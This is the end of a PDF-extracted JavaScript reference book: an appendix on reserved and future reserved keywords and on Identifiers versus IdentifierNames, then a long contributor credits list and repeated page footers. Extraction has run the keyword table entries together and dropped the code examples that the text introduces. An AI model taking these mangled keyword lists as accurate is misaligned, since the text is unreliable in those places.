defaultinstanceoftruedeleteinterfacetrydolettypeofelsenewvarenumnullvoidexportpackagewhileextendsprivatewithfalseprotectedyieldimplements, let, private, public, interface, package, protected, static, and yield are disallowed in strict mode only.
  eval and arguments are not reserved words but they act like it in strict mode. ECMAScript 6 / ECMAScript 2015
A - E	E - RS - Zbreak	exportsupercase	extendsswitchcatch	finallythisclass	forthrowconst	functiontrycontinueiftypeofdebuggerimportvardefault invoiddelete instanceofwhile
do	new	with
else	return	yield
Future reserved keywords
The following are reserved as future keywords by the ECMAScript specification. They have no special functionality at present, but they might at some future time, so they cannot be used as identifiers. enum
The following are only reserved when they are found in strict mode code:
implementspackage public interface private `static' let	protected
Future reserved keywords in older standards
The following are reserved as future keywords by older ECMAScript specifications (ECMAScript 1 till 3).
abstractfloat short boolean goto synchronized byte instanceofthrows
char	int	transient double long	volatile final	native
Additionally, the literals null, true, and false cannot be used as identifiers in ECMAScript.
From the Mozilla Developer Network.
Section A.2: Identifiers & Identifier Names
With regards to reserved words there is a small distinctions between the "Identifiers" used for the likes of variable or function names and the "Identifier Names" allowed as properties of composite data types.
For example the following will result in an illegal syntax error:

However the name is deemed valid as a property of an object (as of ECMAScript 5+):

To quote from this answer:
From the ECMAScript(r) 5.1 Language Specification:
Section 7.6
Identifier Names are tokens that are interpreted according to the grammar given in the "Identifiers" section of chapter 5 of the Unicode standard, with some small modifications. An Identifier is an IdentifierName that is not a ReservedWord (see 7.6.1).


This includes keywords, future keywords, null, and boolean literals. The full list of keywords are in Sections 7.6.1 and literals are in Section 7.8.
The above (Section 7.6) implies that IdentifierNames can be ReservedWords, and from the specification for object initializers:


As you can see, a PropertyName may be an IdentifierName, thus allowing ReservedWords to be PropertyNames. That conclusively tells us that, by specification, it is allowed to have ReservedWords such as class and var as PropertyNames unquoted just like string literals or numeric literals.
To read more, see Section 7.6 - Identifier Names and Identifiers.
Note: the syntax highlighter in this example has spotted the reserved word and still highlighted it. While the example is valid JavaScript developers can get caught out by some compiler / transpiler, linter and minifier tools that argue otherwise.
Credits
Thank you greatly to all the people from Stack Overflow Documentation who helped provide this content, more changes can be sent to web@petercv.com for new content to be published or updated
16807Chapter 1042426021684Chapters 1, 7, 12, 42 and 594444Chapter 234m1rChapter 100A.JChapter 61A.M.KChapters 5, 12, 40, 63, 72 and 73Aadit M ShahChapter 29Abdelaziz MokhnacheChapter 1AbhishekChapter 65Abhishek SinghChapter 48Adam HeathChapter 59adiusChapter 31adriennetackeChapter 68AeolingamenfelChapter 62afzalexChapter 42Ahmed AyoubChapter 12aikeruChapter 14Ajedi32Chapter 16Akshat MahajanChapter 53Ala Eddine JEBALIChapters 1, 24 and 56Alberto NicolettiChapters 13, 14 and 43Alejandro NanezChapter 12AlexChapter 63Alex FilatovChapters 14, 35 and 67Alex LoganChapter 5Alexander O'MaraChapter 1Alexandre N.Chapters 1 and 42aluxianChapter 81amflareChapter 20AminadavChapters 1, 35 and 104Andrew BurgessChapter 55Andrew MyersChapter 4Andrew SklyarevskyChapters 59 and 98Andrew SunChapter 59AndreyChapter 14Angel PolitisChapters 36 and 47Angela AmarapalaChapter 26Angelos ChalarisChapters 13, 37 and 46Ani MenonChapters 1 and 36Anirudh ModiChapters 12, 19, 50, 60 and 62AnirudhaChapter 103AnkoChapter 1Ankur AnandChapter 1Anurag Singh BishtChapter 87Ara YeressianChapter 42AraknidChapters 11 and 30arbybruceChapter 33
ArmfootChapter 62AstroCBChapter 1AswinChapter 21Atakan GoktepeChapter 5ATechieThoughtChapter 1Ates GoralChapters 3, 35 and 42Awal GargChapters 41 and 42azzChapter 10BadacadabraChapter 25bagaChapter 5balphaChapter 12BamiehChapter 12BarakDChapter 22BarmarChapter 14Basilin JoeChapter 28BeauChapter 5Bekim BacajChapter 1BenChapter 12Ben McCormickChapter 60BenjadahlChapter 19BennettChapter 70bfavarettoChapter 1Bit ByteChapter 89BlackChapter 1Blindman67Chapters 10, 12, 14, 28, 41, 56, 84 and 104bloodyKnucklesChapter 63Blubberguy22Chapter 11Blue SheepChapters 14 and 104BluePillChapter 7Blundering PhilosopherChapters 1 and 42bobylitoChapter 42Boopathi RajaaChapters 22, 41, 50 and 63Borja TurChapters 13 and 19Božo StojkovićChapters 1, 12 and 42Brandon BuckChapter 1Brendan DohertyChapter 50brentonstrineChapter 19Brett DeWoodyChapter 12Brett ZamirChapters 1 and 4Brian LiuChapter 105bwegsChapters 1, 56 and 62C L K KissaneChapter 5Callan HeardChapter 50CamJohnson26Chapter 50catalogue_numberChapter 1cchamberlainChapter 5CD..Chapters 12 and 13cdmChapter 58cdriniChapters 19 and 55CerbrusChapters 1, 5, 14, 17, 40, 42, 99 and 103cFreedChapter 10Charlie HChapters 10, 14, 35 and 54Chong Lip PhangChapter 50
chozChapter 19ChrisChapters 10 and 22ChristianChapter 2Christian LandgrenChapter 13ChristophChapter 1Christophe MaroisChapter 42Christopher RonningChapter 27ClaudiuChapters 7 and 42Cliff BurtonChapters 13 and 19Code UniquelyChapter 18codemanoChapter 12code_monkChapter 12CodingIntrigueChapters 7, 12, 13, 50, 57 and 69ColinChapter 10cone56Chapter 92Conlin DurbinChapter 27CPHPythonChapters 5, 12, 19, 50, 56 and 62Creative JohnChapter 24CroMagnonChapters 27 and 48csanderChapters 6, 8, 18, 38, 43, 56 and 85cswlChapters 15 and 81Daksh GuptaChapters 1 and 62DamonChapters 11, 12, 19 and 62Dan PantryChapter 42DanielChapter 12Daniel HerrChapters 11, 12, 18, 30, 35, 41, 42 and 55Daniel LInChapter 79daniellmbChapters 1 and 42daniphiliaChapter 102DarkKnightChapters 19 and 60dauruyChapter 12Dave SagChapters 42 and 100David ArchibaldChapter 1David G.Chapters 1 and 42David KnipeChapter 56DavisChapters 14, 19, 59 and 62DawnPaladinChapters 5, 59 and 99Deepak BansalChapter 99Denys SéguretChapter 104Derek 朕會功夫Chapter 35DevDigChapter 62Devid FarinelliChapters 1 and 99devlin carnateChapter 42Diego MolinaChapter 59dns_nxChapter 12DomenicChapters 12 and 49DontVoteMeDownChapter 1DowngoatChapters 73 and 96Dr. CoolChapter 90Dr. J. TestingtonChapter 12DrewChapter 14dunnzaChapter 42Durgpal SinghChapters 19 and 42
DVJexChapter 99DzinXChapter 12Ehsan SajjadChapter 99Eirik BirkelandChapter 19EkinChapters 37 and 67eltonkamamiChapters 18, 19, 31, 62 and 99EmissaryChapters 5, 17, 104 and 106Emre BolatChapter 106Erik MinariniChapter 42EthanChapter 62et_lChapters 13 and 65Evan BechtolChapter 42EverettssChapters 1, 19 and 57Explosion PillsChapter 81Fab313Chapter 22fraczChapters 12 and 42Frank TanChapter 60FrankCamaraChapter 12FredMaggiowskiChapter 13fsonChapters 42 and 81Gabriel FurstenheimChapter 41Gabriel L.Chapter 42Gaurang TandonChapter 14Gavishiddappa GadagiChapter 19gcaChapter 10gcampbellChapter 7geekonautChapters 61, 63 and 89georgChapter 42George BaileyChapters 12, 13, 30 and 90GingerPlusPlusChapter 99gmanChapters 1, 5 and 29gnerkusChapter 11GOTO 0Chapters 7, 67 and 78GrundyChapter 10Guybrush ThreepwoodChapter 22H. PauwelynChapters 1 and 65hairboatChapter 19Hans StrauslChapters 3 and 12hansmaadChapter 12Hardik Kanjariya ツChapters 12, 14, 46 and 47harish gadiyaChapter 104haykamChapters 1, 5, 7 and 101Hayko KoryunChapter 14HC_Chapter 64HDTChapter 43HendryChapter 91Henrique BarcelosChapters 42 and 56Hi I'm FrogattoChapter 7hibyChapter 33hindmostChapters 14 and 29hirnwundeChapter 5hirseChapter 36HopeNickChapters 15 and 85
Hunan RostomyanChapter 12I am always rightChapter 83Iain BallardChapter 50IanChapters 10, 19 and 35iBelieveChapters 55 and 57Igor RaushChapters 10, 41, 42, 57 and 62Inanc GumusChapters 1, 5 and 81inetphantomChapter 1Ishmael SmyrnowChapter 12Isti115Chapter 12iulianChapter 15IvanChapter 36ivarniChapter 22J FChapters 14, 58, 59, 89 and 90jabacchettaChapter 62James DonnellyChapter 32James LongChapter 12JamieChapter 10Jan PokornýChapter 13Jason ParkChapter 12JayChapters 19 and 22JBCPChapters 3 and 42jbmartinezChapter 19jchavannesChapter 30jchitelChapter 42JCOC611Chapter 40JDBChapter 19Jean LourençoChapter 19JefChapter 106Jeremy BanksChapters 1, 10, 12, 13, 14, 19, 22, 27, 33, 35, 36, 50, 51, 53, 54, 55, 62, 71, 94 and 97Jeremy J StarcherChapter 12JeroenChapters 1 and 11JimmyLvChapter 81JinwChapter 79jisooChapter 12jitendra varshneyChapter 1JivingsChapters 10, 35, 50 and 55jkdevChapters 3, 10, 12, 18, 30, 35, 36, 39 and 56JKillianChapter 31jmattheisChapter 1JohnChapter 13John ArcherChapter 99John CChapter 8John OksasogluChapter 28John SlegersChapters 1, 8, 12, 35, 42, 53 and 62John SyrinekChapters 29 and 68Jonas W.Chapter 13Jonathan LamChapters 1, 7, 29 and 45Jonathan WaltersChapters 18, 27 and 31JosephChapters 19 and 42Joshua KleveterChapters 1 and 25Junbang HuangChapter 76
Just a studentChapters 5 and 74K48Chapters 1, 9, 10, 33, 42 and 99kamoroso94Chapters 8, 14, 19 and 64kanakaChapter 61kapantzakChapters 20 and 62KaruppiahChapter 1Kayce BasquesChapter 63KeithChapters 81 and 82KemiChapter 69kevguyChapters 62 and 63Kevin KatzkeChapter 10Kevin LawChapter 19khawarPKChapter 10Kit GroseChapter 54KnuChapters 10, 11, 13, 14, 18, 35, 36, 97 and 99KoushaChapter 10Kyle BlakeChapters 10 and 12L BahrChapters 10, 37, 66 and 102leo.fcxChapter 42Li357Chapter 106LiamChapter 17Lisa GagarinaChapter 65LiShuaiyuanChapter 35Little ChildChapter 41little pootisChapter 1Louis BarranqueiroChapters 13, 35 and 65Luís HendrixChapters 10, 60 and 104Luc125Chapters 7 and 12luisfarzatiChapter 42M. ErraysyChapter 12Maciej GurbanChapters 12 and 65Madara UchihaChapters 19, 20, 59, 60, 81 and 82maheekaChapter 9maiomanChapters 19 and 42Marco BonelliChapters 3, 53 and 96Marco ScabbioloChapters 3, 10, 13, 17, 20, 27, 30, 42, 46, 56, 57, 68, 69, 81 and 90Marina K.Chapters 10 and 104markChapters 19 and 56Mark SchultheissChapters 5 and 99mashChapter 10MasterBobChapters 1, 19, 24, 25 and 81Matas VaitkeviciusChapters 1, 6 and 42Mathias BynensChapter 1Matt LishmanChapter 57Matt SChapter 31Mattew WhittChapter 42Matthew CrumleyChapters 18, 67, 84 and 104maurisChapters 33 and 56Max AlcalaChapters 12, 19, 41 and 56Maximillian LaumeisterChapter 42Md. Mahbubul HaqueChapter 13MEGADEVOPSChapter 1MegaTomChapter 11
MeowChapters 7, 11, 14, 19, 59 and 62metal03326Chapters 92 and 99Michal PietraszkoChapter 17Michał PerłakowskiChapters 1, 35, 38, 43, 76, 77 and 81MichielChapter 12MijagoChapter 97Mike CChapters 10, 11, 12, 13, 18, 19, 37, 57 and 65Mike McCaughanChapters 3, 8, 9, 12, 13, 15 and 42MikhailChapters 5, 7, 12, 14, 33, 39, 45, 55 and 58MikkiChapter 97MimouniChapters 1 and 12miquelarranzChapter 89MobiletainmentChapter 89Mohamed ElChapter 55monikapatelChapter 5Morteza TouraniChapter 12MotocarotaChapter 42MottieChapters 10, 12, 14 and 18murrayjuChapter 81n4m31ess_c0d3rChapter 10NachikethaChapter 63Naeem ShaikhChapters 42 and 69nalplyChapters 10 and 42Naman SanchetiChapters 1 and 50nasoj1100Chapter 12Nathan TuggyChapter 7naveenChapter 65nduggerChapters 17, 19, 22 and 62NealChapters 12, 13, 19, 22, 27, 36 and 62Nelson TeixeiraChapter 12nem035Chapters 10, 12, 20, 60 and 65nhahtdhChapter 31NhanChapters 12 and 35ni8mrChapters 10 and 18nicaelChapters 11, 42, 44 and 99Nicholas MontañoChapter 102NickChapter 1Nick LarsenChapter 61NickHTTPSChapter 63Nikita KurtinChapters 99 and 104Nikola LukicChapters 58 and 101Nina ScholzChapters 12 and 40NisargChapter 66npdotyChapter 71nseepanaChapter 104Nuri TasdemirChapters 42 and 62nusChapter 19nylkiChapter 1OriolChapter 10Ortomala LokniChapter 10orviChapters 1 and 18Oscar JaraChapter 10Ovidiu DolhaChapter 93Ozan	Chapter 75
oztune	Chapters 5, 18, 55 and 57
P.J.Meisch Chapter 62 PageYe	Chapter 10
Pankaj Upadhyay	Chapter 62 Parvez Rahaman	Chapters 30 and 72
patrick96	Chapter 42
Paul S.	Chapters 7, 10, 19, 27, 31 and 62
Pawel Dubiel	Chapters 17 and 59 PedroSouki	Chapters 23 and 65
pensan	Chapter 14
Peter Bielak	Chapter 94
Peter G	Chapter 5
Peter LaBanca	Chapter 1
Peter Olson	Chapter 13 Peter Seliger	Chapter 22 phaistonian	Chapter 12
Phil	Chapter 13 pietrovismara	Chapter 89 Pinal	Chapters 19, 42 and 55 pinjasaur	Chapter 4 PitaJ	Chapter 65
Pranav C Balan	Chapter 12 programmer5000	Chapter 95 ProllyGeek	Chapters 20, 65 and 79 pzp	Chapters 8, 30 and 71
Qianyue	Chapters 12, 60 and 62
QoP	Chapters 12, 19, 22, 35, 42 and 57
Quartz Fog	Chapters 31 and 54
Quill	Chapters 7 and 42
Racil Hilan	Chapter 34 Rafael Dantas	Chapter 12
Rahul Arora	Chapters 20 and 29
Rajaprabhu Aravindasamy Chapter 13
Rajesh	Chapter 10
Rakitić	Chapter 1
RamenChef	Chapter 14
Randy	Chapters 19 and 50
Raphael Schweikert	Chapter 10 rfsbsb	Chapter 67 richard	Chapter 37
Richard Hamilton	Chapters 7, 10, 12, 14, 31, 48 and 99
Richard Turner	Chapter 62 riyaz	Chapter 42 Roamer	Chapter 42
Rohit Jindal	Chapters 30 and 40
Rohit Kumar	Chapter 57
Rohit Shelhalkar	Chapter 5
Roko C. Buljan	Chapters 4, 7, 12, 14, 33, 44, 45, 89 and 106
rolando	Chapters 12, 13, 18 and 19
rolfedh	Chapter 19
Ronen Ness	Chapters 12, 19, 32 and 43
ronnyfm	Chapter 1

royhowieChapter 35Ruhul AminChapter 41rvighneChapters 13, 19, 22, 45 and 88RyChapter 31S WillisChapter 8sabithpockerChapter 7Sagar VChapters 19, 29 and 61Sammy I.Chapter 20SandroChapter 12SarathChandraChapter 11Saroj SasmalChapter 1ScimonsterChapter 24Sean VieiraChapter 27SeanKendleChapter 1SeinopSysChapters 1 and 96SEUHChapter 61SgtPookiChapter 97shaedrichChapter 70shaNChapter 90ShawnChapter 60Shog9Chapters 19 and 59Shrey GuptaChapter 12Sibeesh VenuChapter 56sielakosChapters 12, 19 and 50SiguzaChapter 40simonvChapter 29SirPythonChapter 5smallmushroomChapter 18Spencer WieczorekChapters 7, 10, 15 and 65spiritChapter 35splayChapters 7, 10 and 40SreekanthChapter 89sscChapter 1stackoverflowethChapter 13Stephen LeppikChapter 40Steve GreatrexChapter 42StewartsideChapter 14StidesChapter 60still_learningChapters 14 and 94styfleChapter 20sudo bangbangChapter 42SumitChapter 11Sumner EvansChapters 99 and 102Sumurai8Chapters 8, 10, 13, 14, 17, 35 and 56Sunny R GuptaChapter 56svarogChapters 7, 17, 43, 80 and 90Sverri M. OlsenChapter 1SZenCChapters 1, 10, 11, 13, 14, 18, 19, 30, 31, 32, 36, 59, 62, 80 and 97TacticusChapter 96tandrewnicholsChapter 19Tanmay NeheteChapter 19Taras LukavyiChapter 59tcoocChapter 42
teppicChapter 42Thomas LeducChapter 31ThriggleChapters 1 and 19TiesChapter 74tiffonChapter 101TimChapter 30Tim RijavecChapter 86Tiny GiantChapter 36tjfwalkerChapter 11tngaChapter 1TolenChapter 1Tomás CañibanoChapters 7 and 59TomboyoChapter 17tomturtonChapter 65tonChapter 56Tot ZamChapter 36towerofnixChapter 38transistor09Chapter 33Traveling Tech GuyChapter 12Travis ActonChapter 1Trevor ClarkeChapters 8, 14 and 46trincotChapters 19 and 35TschallackaChapter 65TusharChapters 1 and 31user2314737Chapters 8, 12, 14, 19, 35, 50, 59 and 104user3882768Chapter 11VaclavChapter 12VahagnNikoghosianChapters 12 and 104Vasiliy LevykinChapters 3, 10 and 19VenChapters 1, 10 and 42Victor BjelkholmChapter 5VisioNChapters 12 and 52Vlad NiculaChapter 62Vladimir GabrielyanChapter 42wackozackoChapters 42 and 60WebBrotherChapter 65whalesChapters 8 and 18WillChapter 62Wladimir PalantChapters 5, 10, 42 and 62WolfgangChapter 30wuxiandiejiaChapters 7, 12 and 43XavCo7Chapters 1, 11, 12, 13, 18, 40, 50, 63, 64, 71, 90 and 92ximsChapter 1YakovLChapter 56ymzChapter 19Yosvel QuinteroChapters 1, 5, 12, 13, 14, 17, 22, 34, 35, 42 and 104YumikoChapter 33Yury FedorovChapters 1 and 42Zack HarleyChapter 56ZagaChapter 31ZazChapter 42zb'Chapter 42zer00neChapter 12
ZeroBased_IXChapter 12ZheganChapter 35zhirzhChapters 12, 14 and 19ZirakChapter 56Zoltan.TamasiChapter 42zur4ikChapters 19 and 62zurfyxChapter 70ZzeChapter 1
You may also like

















GoalKicker.com - JavaScript(r) Notes for Professionals	1

GoalKicker.com - JavaScript(r) Notes for Professionals	1



GoalKicker.com - JavaScript(r) Notes for Professionals	1





GoalKicker.com - JavaScript(r) Notes for Professionals	1

GoalKicker.com - JavaScript(r) Notes for Professionals	1



GoalKicker.com - JavaScript(r) Notes for Professionals	1





GoalKicker.com - JavaScript(r) Notes for Professionals	1

GoalKicker.com - JavaScript(r) Notes for Professionals	1



GoalKicker.com - JavaScript(r) Notes for Professionals	1





GoalKicker.com - JavaScript(r) Notes for Professionals	394

GoalKicker.com - JavaScript(r) Notes for Professionals	394



GoalKicker.com - JavaScript(r) Notes for Professionals	394





GoalKicker.com - JavaScript(r) Notes for Professionals	1

GoalKicker.com - JavaScript(r) Notes for Professionals	1



GoalKicker.com - JavaScript(r) Notes for Professionals	1













